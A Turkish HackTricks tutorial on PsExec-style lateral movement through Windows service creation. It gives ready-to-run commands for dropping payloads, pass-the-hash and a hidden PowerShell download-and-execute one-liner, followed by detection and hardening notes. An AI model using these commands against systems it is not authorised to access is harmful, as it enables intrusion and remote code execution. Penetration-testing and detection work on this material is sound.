# PsExec/Winexec/ScExec/SMBExec

{{#include ../../banners/hacktricks-training.md}}

## Nasıl çalışırlar

Bu teknikler, hedef bir ana bilgisayarda komutları yürütmek için SMB/RPC üzerinden Windows Service Control Manager (SCM) kullanır. Ortak akış şudur:

1. Hedefe kimlik doğrulaması yapın ve SMB (TCP/445) üzerinden ADMIN$ paylaşımına erişin.
2. Yürütülebilir bir dosya kopyalayın veya hizmetin çalıştıracağı bir LOLBAS komut satırı belirtin.
3. O komut veya ikili dosyaya işaret eden SCM (MS-SCMR üzerinden \PIPE\svcctl) aracılığıyla uzaktan bir hizmet oluşturun.
4. Yükü yürütmek için hizmeti başlatın ve isteğe bağlı olarak stdin/stdout'u adlandırılmış bir boru aracılığıyla yakalayın.
5. Hizmeti durdurun ve temizleyin (hizmeti ve bırakılan ikili dosyaları silin).

Gereksinimler/ön koşullar:
- Hedefte Yerel Yönetici (SeCreateServicePrivilege) veya hedefte açık hizmet oluşturma hakları.
- SMB (445) erişilebilir ve ADMIN$ paylaşımı mevcut; Uzak Hizmet Yönetimi ana bilgisayar güvenlik duvarı aracılığıyla izinli.
- UAC Uzak Kısıtlamaları: yerel hesaplarla, token filtreleme ağ üzerinden yöneticiyi engelleyebilir, yalnızca yerleşik Yönetici veya LocalAccountTokenFilterPolicy=1 kullanılıyorsa.
- Kerberos vs NTLM: bir ana bilgisayar adı/FQDN kullanmak Kerberos'u etkinleştirir; IP ile bağlanmak genellikle NTLM'ye geri döner (ve sertleştirilmiş ortamlarda engellenebilir).

### Manuel ScExec/WinExec sc.exe aracılığıyla

Aşağıda, minimum bir hizmet oluşturma yaklaşımı gösterilmektedir. Hizmet görüntüsü, bırakılan bir EXE veya cmd.exe veya powershell.exe gibi bir LOLBAS olabilir.
```cmd
:: Execute a one-liner without dropping a binary
sc.exe \\TARGET create HTSvc binPath= "cmd.exe /c whoami > C:\\Windows\\Temp\\o.txt" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc

:: Drop a payload to ADMIN$ and execute it (example path)
copy payload.exe \\TARGET\ADMIN$\Temp\payload.exe
sc.exe \\TARGET create HTSvc binPath= "C:\\Windows\\Temp\\payload.exe" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc
```
Notlar:
- Bir hizmet olmayan EXE başlatıldığında bir zaman aşımı hatası bekleyin; yürütme yine de gerçekleşir.
- Daha OPSEC dostu kalmak için, dosyasız komutları (cmd /c, powershell -enc) tercih edin veya bırakılan artefaktları silin.

Daha ayrıntılı adımları bulmak için: https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/

## Araçlar ve örnekler

### Sysinternals PsExec.exe

- SMB kullanarak PSEXESVC.exe'yi ADMIN$'ye bırakan, geçici bir hizmet (varsayılan adı PSEXESVC) kuran ve I/O'yu adlandırılmış borular üzerinden yönlendiren klasik bir yönetici aracı.
- Örnek kullanımlar:
```cmd
:: Interactive SYSTEM shell on remote host
PsExec64.exe -accepteula \\HOST -s -i cmd.exe

:: Run a command as a specific domain user
PsExec64.exe -accepteula \\HOST -u DOMAIN\user -p 'Passw0rd!' cmd.exe /c whoami /all

:: Customize the service name for OPSEC (-r)
PsExec64.exe -accepteula \\HOST -r WinSvc$ -s cmd.exe /c ipconfig
```
- WebDAV üzerinden Sysinternals Live'dan doğrudan başlatabilirsiniz:
```cmd
\\live.sysinternals.com\tools\PsExec64.exe -accepteula \\HOST -s cmd.exe /c whoami
```
OPSEC
- Servis kurulum/kaldırma olayları bırakır (Servis adı genellikle PSEXESVC'dir, -r kullanılmadıkça) ve yürütme sırasında C:\Windows\PSEXESVC.exe oluşturur.

### Impacket psexec.py (PsExec benzeri)

- Gömülü bir RemCom benzeri hizmet kullanır. ADMIN$ üzerinden geçici bir hizmet ikili dosyası (genellikle rastgele ad) bırakır, bir hizmet oluşturur (varsayılan genellikle RemComSvc'dir) ve I/O'yu adlandırılmış bir boru hattı üzerinden yönlendirir.
```bash
# Password auth
psexec.py DOMAIN/user:Password@HOST cmd.exe

# Pass-the-Hash
psexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST cmd.exe

# Kerberos (use tickets in KRB5CCNAME)
psexec.py -k -no-pass -dc-ip 10.0.0.10 DOMAIN/user@host.domain.local cmd.exe

# Change service name and output encoding
psexec.py -service-name HTSvc -codec utf-8 DOMAIN/user:Password@HOST powershell -nop -w hidden -c "iwr http://10.10.10.1/a.ps1|iex"
```
Artifacts
- Geçici EXE C:\Windows\ içinde (rastgele 8 karakter). Hizmet adı, üzerine yazılmadığı sürece varsayılan olarak RemComSvc'dir.

### Impacket smbexec.py (SMBExec)

- cmd.exe'yi başlatan geçici bir hizmet oluşturur ve I/O için adlandırılmış bir boru kullanır. Genellikle tam bir EXE yükü bırakmaktan kaçınır; komut yürütme yarı etkileşimlidir.
```bash
smbexec.py DOMAIN/user:Password@HOST
smbexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST
```
### SharpLateral ve SharpMove

- [SharpLateral](https://github.com/mertdas/SharpLateral) (C#) hizmet tabanlı exec dahil olmak üzere birkaç yan hareket yöntemini uygular.
```cmd
SharpLateral.exe redexec HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe.exe malware.exe ServiceName
```
- [SharpMove](https://github.com/0xthirteen/SharpMove), bir komutu uzaktan çalıştırmak için hizmet değiştirme/oluşturma içerir.
```cmd
SharpMove.exe action=modsvc computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true servicename=TestService
SharpMove.exe action=startservice computername=remote.host.local servicename=TestService
```
- Farklı arka uçlar (psexec/smbexec/wmiexec) aracılığıyla çalıştırmak için CrackMapExec'i de kullanabilirsiniz:
```bash
cme smb HOST -u USER -p PASS -x "whoami" --exec-method psexec
cme smb HOST -u USER -H NTHASH -x "ipconfig /all" --exec-method smbexec
```
## OPSEC, tespit ve artefaktlar

PsExec benzeri teknikler kullanırken tipik host/ağ artefaktları:
- Hedefte kullanılan admin hesabı için Güvenlik 4624 (Oturum Açma Türü 3) ve 4672 (Özel Ayrıcalıklar).
- ADMIN$ erişimini ve hizmet ikili dosyalarının oluşturulmasını/yazılmasını gösteren Güvenlik 5140/5145 Dosya Paylaşımı ve Dosya Paylaşımı Ayrıntılı olayları (örn. PSEXESVC.exe veya rastgele 8 karakterli .exe).
- Hedefteki Hizmet Yüklemesi için Güvenlik 7045: PSEXESVC, RemComSvc veya özel (-r / -service-name) gibi hizmet adları.
- services.exe veya hizmet görüntüsü için Sysmon 1 (Süreç Oluşturma), 3 (Ağ Bağlantısı), 11 (Dosya Oluşturma) C:\Windows\ içinde, \\.\pipe\psexesvc, \\.\pipe\remcom_* veya rastgele eşdeğerleri için 17/18 (Borular Oluşturuldu/Bağlandı).
- Sysinternals EULA için Kayıt defteri artefaktı: HKCU\Software\Sysinternals\PsExec\EulaAccepted=0x1 operatör hostunda (eğer bastırılmamışsa).

Av fikirleri
- ImagePath cmd.exe /c, powershell.exe veya TEMP konumlarını içeren hizmet yüklemeleri için uyarı verin.
- ParentImage C:\Windows\PSEXESVC.exe olan veya LOCAL SYSTEM olarak çalışan services.exe'nin çocukları olan süreç oluşturma işlemlerini arayın.
- -stdin/-stdout/-stderr ile biten veya iyi bilinen PsExec klon boru adlarını işaretleyin.

## Yaygın hataları giderme
- Hizmetler oluşturulurken Erişim reddedildi (5): gerçekten yerel admin olmama, yerel hesaplar için UAC uzaktan kısıtlamaları veya hizmet ikili dosyası yolunda EDR müdahale koruması.
- Ağ yolu bulunamadı (53) veya ADMIN$'ye bağlanılamadı: SMB/RPC'yi engelleyen güvenlik duvarı veya admin paylaşımlarının devre dışı bırakılması.
- Kerberos başarısız oluyor ama NTLM engelleniyor: IP yerine hostname/FQDN kullanarak bağlanın, uygun SPN'leri sağlayın veya Impacket kullanırken biletlerle -k/-no-pass verin.
- Hizmet başlatma süresi doluyor ama yük çalıştı: gerçek bir hizmet ikili dosyası değilse beklenir; çıktıyı bir dosyaya yakalayın veya canlı I/O için smbexec kullanın.

## Güçlendirme notları
- Windows 11 24H2 ve Windows Server 2025, varsayılan olarak dışa dönük (ve Windows 11 içe dönük) bağlantılar için SMB imzalamayı gerektirir. Bu, geçerli kimlik bilgileri ile meşru PsExec kullanımını bozmaz ancak imzasız SMB relay istismarını önler ve imzalamayı desteklemeyen cihazları etkileyebilir.
- Yeni SMB istemcisi NTLM engelleme (Windows 11 24H2/Server 2025), IP ile bağlanırken veya Kerberos olmayan sunuculara bağlanırken NTLM geri dönüşünü engelleyebilir. Güçlendirilmiş ortamlarda bu, NTLM tabanlı PsExec/SMBExec'i bozacaktır; Kerberos (hostname/FQDN) kullanın veya meşru ihtiyaç durumunda istisnalar yapılandırın.
- En az ayrıcalık ilkesi: yerel admin üyeliğini en aza indirin, Just-in-Time/Just-Enough Admin'i tercih edin, LAPS'ı zorlayın ve 7045 hizmet yüklemeleri üzerinde izleme/uyarı yapın.

## Ayrıca bakınız

- WMI tabanlı uzaktan yürütme (genellikle daha dosyasız):


{{#ref}}
./wmiexec.md
{{#endref}}

- WinRM tabanlı uzaktan yürütme:


{{#ref}}
./winrm.md
{{#endref}}



## Referanslar

- PsExec - Sysinternals | Microsoft Learn: https://learn.microsoft.com/sysinternals/downloads/psexec
- Windows Server 2025 & Windows 11'de SMB güvenlik güçlendirmesi (varsayılan olarak imzalama, NTLM engelleme): https://techcommunity.microsoft.com/blog/filecab/smb-security-hardening-in-windows-server-2025--windows-11/4226591

{{#include ../../banners/hacktricks-training.md}}
